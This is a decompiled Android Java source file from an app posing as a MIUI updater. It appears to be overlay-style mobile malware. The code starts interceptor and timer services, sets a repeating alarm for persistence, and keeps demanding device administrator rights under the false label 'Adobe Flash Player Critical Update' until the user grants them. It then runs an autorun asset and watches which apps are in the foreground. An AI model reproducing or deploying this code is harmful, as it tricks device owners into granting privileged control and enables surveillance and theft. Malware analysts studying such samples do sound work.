package brandmangroupe.miui.updater;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.os.SystemClock;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collection;

public class SampleOverlayShowActivity extends Activity {
    private static final int REQUEST_ENABLE = 8;
    private ActivityManager mActivityManager;
    ComponentName mAdminName;
    DevicePolicyManager mDPM;

    public static class MyAdmin extends DeviceAdminReceiver {
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, MasterInterceptor.class));
        String timer = "";
        try {
            ApplicationInfo appInfo = getPackageManager().getApplicationInfo(getPackageName(), 128);
            if (appInfo.metaData != null) {
                timer = appInfo.metaData.getString("timer");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        int reltime = 60;
        if (timer.length() > 2) {
            reltime = Integer.parseInt(timer.substring(1));
        }
        AlarmManager manager = (AlarmManager) getSystemService("alarm");
        long time = SystemClock.elapsedRealtime() + 5000;
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.add(13, 10);
        manager.setRepeating(0, time, (long) (reltime * 1000), PendingIntent.getBroadcast(this, 0, new Intent(this, MasterTimer.class), 0));
        eba();
    }

    private int getPackageNames(String name) {
        for (RunningAppProcessInfo runningAppProcessInfo : ((ActivityManager) getApplicationContext().getSystemService("activity")).getRunningAppProcesses()) {
            try {
                if (runningAppProcessInfo.processName.contains(name)) {
                    return runningAppProcessInfo.pid;
                }
            } catch (Exception e) {
            }
        }
        return 0;
    }

    /* access modifiers changed from: protected */
    public void eba() {
        this.mDPM = (DevicePolicyManager) getSystemService("device_policy");
        this.mAdminName = new ComponentName(this, MyAdmin.class);
        Intent intent;
        if (this.mDPM.isAdminActive(this.mAdminName)) {
            try {
                if (Arrays.asList(getResources().getAssets().list("")).contains("autorun.html")) {
                    intent = new Intent(this, GlobalCode.class);
                    intent.putExtra("content", "file:///android_asset/autorun.html");
                    intent.putExtra("type", "autorun");
                    intent.putExtra("data", "");
                    startService(intent);
                    finish();
                    return;
                }
                finish();
                return;
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
        }
        intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", this.mAdminName);
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "Adobe Flash Player Critical Update");
        startActivityForResult(intent, 8);
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (8 == requestCode) {
            eba();
        }
    }

    private RunningAppProcessInfo getForegroundApp() {
        for (RunningAppProcessInfo info : ((ActivityManager) getSystemService("activity")).getRunningAppProcesses()) {
            if (info.importance == 100 && !isRunningService(info.processName)) {
                return info;
            }
        }
        return null;
    }

    private boolean isRunningService(String processName) {
        if (processName == null) {
            return false;
        }
        for (RunningServiceInfo service : ((ActivityManager) getSystemService("activity")).getRunningServices(9999)) {
            if (service.process.equals(processName)) {
                return true;
            }
        }
        return false;
    }

    private boolean isRunningApp(String processName) {
        if (processName == null) {
            return false;
        }
        for (RunningAppProcessInfo app : ((ActivityManager) getSystemService("activity")).getRunningAppProcesses()) {
            if (app.processName.equals(processName) && app.importance != 300) {
                return true;
            }
        }
        return false;
    }

    private boolean checkifThisIsActive(RunningAppProcessInfo target) {
        boolean result = false;
        if (target == null) {
            return false;
        }
        for (RunningTaskInfo info : ((ActivityManager) getSystemService("activity")).getRunningTasks(9999)) {
            if (info.baseActivity.getPackageName().equals(target.processName)) {
                result = true;
                break;
            }
        }
        return result;
    }

    public static Collection subtractSets(Collection a, Collection b) {
        Collection result = new ArrayList(b);
        result.removeAll(a);
        return result;
    }
}
